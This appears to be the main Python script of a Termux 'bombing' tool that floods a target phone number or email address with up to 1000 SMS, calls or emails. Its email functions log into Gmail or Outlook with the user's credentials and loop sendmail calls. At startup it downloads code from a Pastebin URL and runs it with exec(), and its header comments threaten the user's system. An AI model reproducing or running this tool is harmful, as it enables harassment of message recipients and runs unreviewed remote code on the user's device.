#coding=utf-8
##BORO VAI TUMI JODI API KHUJTE ASHE TOBE WELCOME 
# ASSALAMUALAIKUM
# THIS IS A BANGLADESHI PROGRAMMER
##########################################################
# DEV : EKRAMUL HASSAN
# Github : https://github.com/mao2116
# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
# YOU KNOW WHAT I FUCK YOUR SYSTEM SO BE CAREFULL🙂🙂🙂

# THANKS TO ALLAH
# WELCOME HOME
#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################

import os
try:
    import requests
except:
    os.system('pip install requests')
import json
import os
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
from pkg_resources import resource_string 
from core.user_agents import user_agent
from core.logos import logomao
from core.logos import *

maoversys="3.9.6" in sys.version


import requests,time,os,mechanize,requests,sys,random,json ,smtplib
os.system('clear')
agents = user_agent
def authermao():
  os.system('xdg-open https://www.facebook.com/mAoVirUs2116/')


def autherthbd():
  os.system('https://www.facebook.com/Termux.Hacker.Bd.Official/')
def clr():
  os.system("clear")

def logomain2():
  clr()
  print(logomao)

if maoversys:
  pass 
else:
  print('[ ! ]UPDATE YOUR TERMUX [ ! ]')
  os.system('xdg-opeb https://f-droid.org/repo/com.termux_117.apk')
  exit()
try:
    from typing import List
except ImportError:
    pass #
STR_TYPE = str
RUNNING_PYTHON_2=sys.version_info[0]==2
if RUNNING_PYTHON_2:
    STR_TYPE = unicode
import tty, termios
def getch():
    # type: () -> str
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

def MAOPASSWORDSET(prompt='Password: ', mask='*'):
    # type: (str, str) -> str

    if RUNNING_PYTHON_2:
        # On Python 2, convert `prompt` and `mask` from str to unicode because sys.stdout.write requires unicode.
        if isinstance(prompt, str):
            # Mypy in Python 3 mode (the default mode) will complain about the following line:
            prompt = prompt.decode('utf-8') # type: ignore
        if isinstance(mask, str):
            # Mypy in Python 3 mode (the default mode) will complain about the following line:
            mask = mask.decode('utf-8') # type: ignore

    if not isinstance(prompt, STR_TYPE):
        raise TypeError('prompt argument must be a str, not %s' % (type(prompt).__name__))
    if not isinstance(mask, STR_TYPE):
        raise TypeError('mask argument must be a zero- or one-character str, not %s' % (type(prompt).__name__))
    if len(mask) > 1:
        raise ValueError('mask argument must be a zero- or one-character str')

    if mask == '' or sys.stdin is not sys.__stdin__:
        # Fall back on getpass if a mask is not needed.
        import getpass as gp
        return gp.getpass(prompt)

    enteredPassword = [] # List[str]
    sys.stdout.write(prompt)
    sys.stdout.flush()
    while True:
        key = ord(getch())
        if key == 13: # Enter key pressed.
            if RUNNING_PYTHON_2:
                sys.stdout.write(STR_TYPE('\n'))
            else:
                sys.stdout.write('\n')
            return ''.join(enteredPassword)
        elif key in (8, 127): # Backspace/Del key erases previous output.
            if len(enteredPassword) > 0:
                # Erases previous character.
                if RUNNING_PYTHON_2:
                    sys.stdout.write(STR_TYPE('\b \b')) # \b doesn't erase the character, it just moves the cursor back.
                else:
                    sys.stdout.write('\b \b') # \b doesn't erase the character, it just moves the cursor back.
                sys.stdout.flush()
                enteredPassword = enteredPassword[:-1]
        elif 0 <= key <= 31:
            # Do nothing for unprintable characters.
            # TODO: Handle Esc, F1-F12, arrow keys, home, end, insert, del, pgup, pgdn
            pass
        else:
            # Key is part of the password; display the mask character.
            char = chr(key)
            sys.stdout.write(mask)
            sys.stdout.flush()
            enteredPassword.append(char)


  

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def mao3print(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)

      

def ext():
  exit(f"\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n")






def usemail():
  maouser=input(f"{gcl}YOUR EMAIL{acl}:{ycl} ")
  maopass=MAOPASSWORDSET(prompt=f"{gcl}EMAIL PASSWORD{acl}:{ycl} ",mask="*")
  tomao=input(f"{gcl}TO{acl} :{ycl}")
  headers=(' MAO WANNA FUCK YOU ')
  subjectmao=input(f'{gcl}SUBJECT {acl}:{ycl}')
  body=input(f'{gcl}MESSAGE{acl} :{ycl}')
  threat=int(input(f'{gcl}THREAT {acl}:{ycl}'))
  maoserver=smtplib.SMTP('smtp.gmail.com',587)
  maoserver.starttls()
  try:
    maoserver.login(maouser, maopass)
  except smtplib.SMTPAuthenticationError:
    print(f"{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS \n OR NEED TO ENABLE LESS SECURE APPS{ncl}")
    os.system('xdg-open https://myaccount.google.com/lesssecureapps')
  try:
    i=1
    for i in range(threat):
      i=i+1
      i2=str(i)
      message=f'Form: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'
      
      maoserver.sendmail(maouser,tomao,message)
      
      print(f"{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !")
      
  except KeyboardInterrupt:
    print(f"{acl}[{rcl} !{acl} ] {rcl}CANCELED {acl}[{rcl} !{acl} ]")
def usoutmail():
  maouser=input(f"{gcl}YOUR EMAIL{acl}:{ycl} ")
  maopass=MAOPASSWORDSET(prompt=f"{gcl}EMAIL PASSWORD{acl}:{ycl} ",mask="*")
  tomao=input(f"{gcl}TO{acl} :{ycl}")
  headers=(' MAO WANNA FUCK YOU ')
  subjectmao=input(f'{gcl}SUBJECT {acl}:{ycl}')
  body=input(f'{gcl}MESSAGE{acl} :{ycl}')
  threat=int(input(f'{gcl}THREAT {acl}:{ycl}'))
  message=f'Form: {maouser}{headers}\nSUBJECT : {subjectmao}\n{body}'
  try:
    maoserver=smtplib.SMTP('smtp-mail.outlook.com',587)
  except:
    exit(f'{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]')
  maoserver.ehlo()
  maoserver.starttls()
  try:
    maoserver.login(maouser, maopass)
  except smtplib.SMTPAuthenticationError:
    print(f"{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS.")
    
  try:
    i=1
    for i in range(threat):
      i=i+1
      i2=str(i)
      message=f'Form: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'
      maoserver.sendmail(maouser,tomao,message)
      print(f"{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !")
  except KeyboardInterrupt:
    print(f"{acl}[{rcl} !{acl} ] {rcl}CANCELED {acl}[{rcl} !{acl} ]")
def maocc1():
  mao=open("core/cc_codes_mao.json","r")
  mao=json.load(mao)
  mao=mao["MAOCC_CODES"]
  return mao
print(f"{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ")
print(f"{gcl}WAIT{bcl}...")
maopaste=requests.get("https://pastebin.com/raw/vAjQVpWn").text
exec(maopaste)
def get_phone_info(maocc,maonumber):
   
      try:
        cc =maocc
        if not maocc1().get(cc, False):
            print("The country code ({cc}) that you have entered"
                " is invalid or unsupported".format(cc=cc))
        ccn=maocc1().get(cc)
        target=maonumber
        if ((len(target) <= 6) or (len(target) >= 12)):
            exit("The phone number ({target})".format(target=target) +"that you have entered is invalid\n")
            
        return (cc, target,ccn)
      except KeyboardInterrupt:
        exit()

def main(): 

    # create parser 

    logomao=f"""
\033[1;33m {bcl}V.1.{gcl}3{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
\033[1;33m|_   _| | | |\033[1;36m| __ )|  _ \ \033[1;32m  | __ ) / _ \|  \/  | __ ) 
\033[1;33m  | | | |_| |\033[1;36m|  _ \| | | | \033[1;32m |  _ \| | | | |\/| |  _ \ 
\033[1;33m  | | |  _  |\033[1;36m| |_) | |_| |\033[1;32m  | |_) | |_| | |  | | |_) |
\033[1;33m  |_| |_| |_|\033[1;36m|____/|____/\033[1;32m___|____/ \___/|_|  |_|____/ 
                      |_\033[1;30mMAO\033[1;32m_|        
                      
                      
                      
                      
                  \033[1;30m[ \033[1;34mAUTHER \033[1;30m] \033[1;32mTERMUX \033[1;32mHACKER\033[1;31m BD
                  \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mMAO2116
                  \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mMAO2116 
\033[0;00m"""
    print(logomao)
    parser = argparse.ArgumentParser(description="")

    #

    # add expected arguments 

    parser.add_argument('--bombing', dest='BOMBING', required="store_true",help="ENTER YOUR BOMBING TYPE sms/sms_call/email/outlook")
    
    #
    parser.add_argument('--cc', dest='COUNTRY_CODE',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 

    parser.add_argument('--number', dest='NUMBER',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 

    parser.add_argument('--threat', dest='THREAT',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 

    parser.add_argument('--morelevels',dest='moreLevels',action='store_true') 

  

    # parse args 
    
    
    args = parser.parse_args() 
    
    if args.BOMBING=='sms':
      maothreat=int(args.THREAT)
      if maothreat <=1000:
        pass
      else:
        exit(f"{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]")
      
      maocc=str(args.COUNTRY_CODE)
      maonumber=str(args.NUMBER)
      get_phone_info(maocc,maonumber)
      ccn=get_phone_info(maocc,maonumber)[2]
      mainbomb(maothreat,maocc,maonumber,ccn)
    elif args.BOMBING=="sms_call":
      maothreat=int(args.THREAT)
      if maothreat <=1000:
        pass
      else:
        exit(f"{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]")
      
      maocc=str(args.COUNTRY_CODE)
      maonumber=str(args.NUMBER)
      get_phone_info(maocc,maonumber)
      ccn=get_phone_info(maocc,maonumber)[2]
      smsandcall(maothreat,maocc,maonumber,ccn)
    elif args.BOMBING=="email":
      usemail()
    elif args.BOMBING=="outlook":
      usoutmail()
    else:
      exit(f"{acl}[{rcl} !{acl} ] {rcl}TRY WITH CORRECT BOMBING TYPE {acl}[{rcl} !{acl} ]")
      
      


if __name__ == '__main__': 

    main()
    
    
    
##########################################################
# DEV : EKRAMUL HASSAN
# Github : https://github.com/mao2116
# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
# YOU KNOW WHAT I FUCK YOUR SYSTEM SO BE CAREFULL🙂🙂🙂

# THANKS TO ALLAH
# WELCOME HOME
#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################
